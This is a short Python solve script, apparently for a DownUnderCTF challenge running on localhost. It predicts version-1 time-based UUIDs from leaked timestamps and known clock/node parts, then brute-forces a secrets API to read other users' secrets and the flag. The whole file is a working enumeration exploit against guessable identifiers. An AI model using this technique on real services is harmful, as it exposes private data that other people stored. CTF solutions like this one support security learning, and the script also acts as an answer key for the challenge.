import uuid
import itertools

import requests


CHALLENGE_URL = 'http://localhost:1337'

# 1. Get the timestamps we are interested in searching through
uuid_timestamps = requests.get(f"{CHALLENGE_URL}/api/stats").json()['stats']['past_week']

# 2. Create some secrets so we know what the uuids might look like
uuids = [
    requests.post(f"{CHALLENGE_URL}/api/secret", data="secret").text.strip()
    for _ in range(24)
]

# 3. Extract the clock_seq and nodes from the generated uuids
clock_seq_node_part = set(u[-17:] for u in uuids)

# 4. Construct some uuids using
possible_uuids = []

for clock_node, timestamp in itertools.product(clock_seq_node_part, uuid_timestamps):
    # We need to work around floating point errors....
    timestamp_100ns = str(timestamp).replace('.', '')
    timestamp_100ns = timestamp_100ns + '0' * (17 - len(timestamp_100ns))

    uuid_timestamp = hex(int(timestamp_100ns) + 122192928000000000)[2:]
    generated_uuid = "-".join([
        uuid_timestamp[-8:],
        uuid_timestamp[3:-8],
        '1' + uuid_timestamp[:3],
        clock_node
    ])

    possible_uuids.append(generated_uuid)

# 5. Send a request for each uuid
secrets = {}
for possible_uuid in possible_uuids:
    resp = requests.get(f"{CHALLENGE_URL}/api/secret/{possible_uuid}")
    if resp.ok:
        secrets[possible_uuid] = resp.text

# 6. Get the flag
for secret_id, secret in secrets.items():
    print(secret_id, secret)

print('FLAG', next(secret for secret in secrets.values() if secret.startswith('DUCTF{')))
